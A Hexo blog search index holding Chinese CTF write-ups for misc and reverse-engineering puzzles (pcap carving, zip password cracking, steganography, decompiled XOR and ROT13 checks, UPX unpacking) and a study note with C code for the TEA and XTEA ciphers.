<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>长安战疫wp</title>
    <url>/2022/01/09/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABwp/</url>
    <content><![CDATA[<p>他们写的前50%都有参与奖并且面向的是在校大学生，看着就难度合适，我就去看看了，确实有收获，并且难度合适</p>
<span id="more"></span> 

<p>总之我能做出来的确实不是很难</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h4><p><img src="https://s2.loli.net/2022/01/15/R8rPzab25LTck9J.png" alt="W.png"></p>
<p>走迷宫，把经过的卦象替换成对应的字的拼音</p>
<hr>
<h4 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h4><p>打开附件，有个流量包，看起来像字典爆破读网页，可以直接foremost一下</p>
<p>按大小排一下，可以看到有很多打开失败的网页和2个有意义的txt</p>
<p><img src="https://s2.loli.net/2022/01/15/zGlQOs94tWkmZXa.png" alt="图片.png"></p>
<p>Hint里面是这个，暂时看不懂是干啥的</p>
<p><img src="https://s2.loli.net/2022/01/15/wAhoRmslveVq4di.png" alt="图片.png"></p>
<p>Secret里面看起来是base64，但是不能直接在线转码</p>
<p>先看了看最上面那行的一部分，看到PK头，猜测是zip转成base64了</p>
<p>那就转回来</p>
<p><img src="https://s2.loli.net/2022/01/15/aneONVvipZ4WdIz.png" alt="X.png"></p>
<p>输出的文件改成.zip后缀保存</p>
<p>解压拿到拼图</p>
<p>虽然有对应的工具，但是直接手拼也挺快的</p>
<p><img src="https://s2.loli.net/2022/01/15/cjgnifpDo2JMtdZ.png" alt="I.png"></p>
<p>大概能猜到flag是cazy{make_XiAN_great_Again}</p>
<p>那个提示大概是提示哪张图在哪个位置吧</p>
<hr>
<h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a><strong>Ez_Steg</strong></h3><p>下载附件，带密码，提示密码是6位数字，用ziperello爆破得到密码220101</p>
<p><img src="https://s2.loli.net/2022/01/15/p1En73qJXSlx6t9.png" alt="X.png"></p>
<p>题目是steg，这又有个叫steg的pyc，想到stegosaurus隐写，所以直接解密</p>
<p>拿到KeySt3g1sV3ryFuNny</p>
<p><img src="https://s2.loli.net/2022/01/15/TPSk9UCjBI3eF2u.png" alt="5.png"></p>
<p>txt里面是emoji，试了试base100但是不是，所以根据这个key和emoji的前个，推测是emoji-aes</p>
<p><a href="https://aghorler.github.io/emoji-aes/">在这个网站</a></p>
<p>进行一个密的解</p>
<p>得到flag</p>
<p><img src="https://s2.loli.net/2022/01/15/adBRv7CJKnq3Dlj.png" alt="VC.png"></p>
<hr>
<h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><h4 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h4><p>附件是.pyc，用uncompyle6可以直接转成.py</p>
<p>如果看得懂，逻辑也很清晰，在尝试看懂的过程加深了我对python用法的理解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.8 (default, Apr 13 2021, 15:08:03) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: C:\Users\Administrator\Desktop\easy_py.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-12-28 15:45:17</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1099 bytes</span></span><br><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.25</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.25</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [</span><br><span class="line">     <span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    f = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(f) != <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Your input is illegal&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="built_in">list</span>(f)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">            flag[j] = <span class="built_in">ord</span>(i)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag to &#x27;ord&#x27;:&quot;</span>, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.125</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>验证长度后使用时间延迟交叉进行加密1、加密2</p>
<p>加密也只是简单的异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> != <span class="number">0</span> :</span><br><span class="line">        flag+=<span class="built_in">chr</span>(Happy[i]^i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(Happy[i]^Happy[i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/01/15/xNTvZzXb1c6mual.png" alt="Y.png"></p>
<hr>
<h4 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h4><p>放进ida，主函数没看出什么，想F12找找重要的字符串看看哪里引用，直接看到base64字符串，转码拿到flag</p>
<p><img src="https://s2.loli.net/2022/01/15/xzXSI2DaTAcLCGw.png" alt="4O.png"></p>
<hr>
<h4 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h4><p>用JD打开.class附件，找到关键函数</p>
<p>可以看到是对输入的验证长度，进行处理，然后比对密文</p>
<p><img src="https://s2.loli.net/2022/01/15/jA7O9qpg1wYsbEV.png" alt="图片.png"></p>
<p>逻辑很清晰，就是把前13的字母+13，后13的字母-13</p>
<p>其实是rot13，当然也可以把他的代码抄了，作为对称加密，再加密一次就相当于解密</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">200</span>]=&#123;<span class="string">&quot;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">40</span>;i++)</span><br><span class="line">	<span class="keyword">if</span> (a[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; a[i] &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        a[i] = (<span class="keyword">char</span>)(a[i] + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; a[i] &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        a[i] = (<span class="keyword">char</span>)(a[i] + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a[i] &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; a[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        a[i] = (<span class="keyword">char</span>)(a[i] - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a[i] &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; a[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        a[i] = (<span class="keyword">char</span>)(a[i] - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">    <span class="built_in">puts</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="赛后感想"><a href="#赛后感想" class="headerlink" title="赛后感想"></a>赛后感想</h2><p><del>虽然参与奖只是一张jpg，但是也没设置别的奖就是了</del></p>
<p>因为是在准备期末考试期间进行的，所以我还是只是一个人去看看</p>
<p>做出了3道misc，3道re</p>
<p>re剩下2道没做出来的是给客户端，再给服务端，再给流量包，分析加解密方法后把流量包里的加密信息提取出来解密，这题是0解。</p>
<p>还有一个lemon语言的字节码，首先我不知道这种编程语言，其次这字节码可能需要看汇编的能力再多提升才能更好地看懂</p>
]]></content>
  </entry>
  <entry>
    <title>些许关于tea加密算法的记录</title>
    <url>/2021/12/10/%E4%BA%9B%E8%AE%B8%E5%85%B3%E4%BA%8Etea%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>​    最近虽然仍然在不断学习，但似乎没有多少值得总结的东西，于是尝试记录一下常见但是非常不熟的tea加密算法</p>
  <span id="more"></span>     

<hr>
<h2 id="TEA算法简介"><a href="#TEA算法简介" class="headerlink" title="TEA算法简介"></a>TEA算法简介</h2><p>TEA（Tiny Encryption Algorithm）是一种分组加密算法，它的实现非常简单，通常只需要很精短的几行代码。TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。</p>
<p>TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，建议的迭代次数为 32 轮。该算法使用了一个常数 δ 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 δ 的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」（也就是程序中的 0×9E3779B9）。</p>
<p>之后 TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本——XTEA（有时也被称为“tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了。</p>
<hr>
<h2 id="具体算法"><a href="#具体算法" class="headerlink" title="具体算法"></a>具体算法</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>总之就是明文和密钥进入32轮（算法发明者推荐32轮，有时会变）循环，得到最后的64位密文</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">long</span>* EntryData, <span class="keyword">long</span>* Key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//总共加密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>​    加密是</p>
<p>x+=公式</p>
<p>y+=公式</p>
<p>并循环32次</p>
<p>​    因为公式为异或公式，所以解密不用改内容，直接</p>
<p>y-=公式</p>
<p>x-=公式</p>
<p>并循环32次</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decrypt</span><span class="params">(<span class="keyword">long</span>* EntryData, <span class="keyword">long</span>* Key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line">    <span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">        y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>如果是没被魔改过的tea，可以用这个脚本加解密</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">long</span>* EntryData, <span class="keyword">long</span>* Key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//总共加密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decrypt</span><span class="params">(<span class="keyword">long</span>* EntryData, <span class="keyword">long</span>* Key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line">    <span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">        y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> Data[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;  <span class="comment">//明文，必须是8字节的倍数，不够需要程序补全，参考base64方法</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;待加密的数值：%d %d\n&quot;</span>,Data[<span class="number">0</span>],Data[<span class="number">1</span>]);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> key[<span class="number">4</span>] = &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;   <span class="comment">//密钥随便</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Encrypt每次只是加密4字节数组中的两组(也就是每次加密8个字节) 如果你数据多.可以来个for循环来循环加密,但是Entrypt内部还有32次循环,所以速度上还是会有点影响.</span></span><br><span class="line">    Encrypt(Data, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数值：%d %d\n&quot;</span>,Data[<span class="number">0</span>],Data[<span class="number">1</span>]);</span><br><span class="line">    Decrypt(Data, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数值：%d %d\&quot;,Data[0],Data[1]);</span></span><br><span class="line"><span class="string">    system(&quot;</span>pause<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><p>​    tea的升级版，加密逻辑、公式有变化，每轮用于加密的key有变化，不是很了解，先放个加解密脚本在这</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0;</span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0;</span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12345678</span>, <span class="number">0x78563412</span>&#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    encrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Data is : 12345678 78563412</span></span><br><span class="line"><span class="comment">Encrypted data is : ae685ec7 59af4238</span></span><br><span class="line"><span class="comment">Decrypted data is : 12345678 78563412</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>tea加密的特征，大概就是多轮次公式异或，更多情况下是修改过的，那就分析一下，改出能用的解密脚本。</p>
</li>
<li><p>接触的越多，越觉得有些东西不值得去记录，但是又想告诉别人最近学了啥，那还是放一点在博客上吧。</p>
</li>
<li><p>走这条路要学的基础可太多了，好多东西要看，最近身体有点不舒服，学习上有些懈怠。</p>
</li>
<li><p>我觉得我还需要了解一些，或者很多，关于开发的知识。</p>
</li>
<li><p>希望能每天进步一点点，能在未来做自己想做的事吧。</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2021/12/09/vzJf8DjopeO2kuh.jpg" alt="0B2B7B8D47329CBC568D419A26159427.png"></p>
]]></content>
      <tags>
        <tag>re tea</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTFRE部分wp</title>
    <url>/2021/11/05/ISCTFRE%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>虽然这是新生赛，但re我很多题没做出来，有没见过的语言，有静态分析下看的人都麻了的加密，有很多变量放在一起配上非常大的数字，所以学到很多，赚了</p>
<span id="more"></span> 

<h2 id="re签到"><a href="#re签到" class="headerlink" title="re签到"></a>re签到</h2><p>这题给的附件被upx压缩后，又把upx标志改了，没法直接upx -d</p>
<p><img src="https://i.loli.net/2021/11/04/gmpdfM8RsEhvI4Z.png" alt="XRT.png"></p>
<p>所以得用手动脱壳</p>
<p>或者把upx标志从RPX改回去</p>
<p>然后进ida分析就完事了</p>
<hr>
<h2 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h2><p>是一个用unity写的游戏，应该正常通不了关</p>
<p>这题很有意思，很多解法，但是我对这种文件不熟，结束了才通过各种问人才了解到</p>
<p>unity的游戏可以直接找Assembly-CSharp.dll 文件，大部分的逻辑都在</p>
<p><img src="https://i.loli.net/2021/11/04/a2wIPDrGdLZRESV.png" alt="DGQ.png"></p>
<p>用dnspy打开该文件</p>
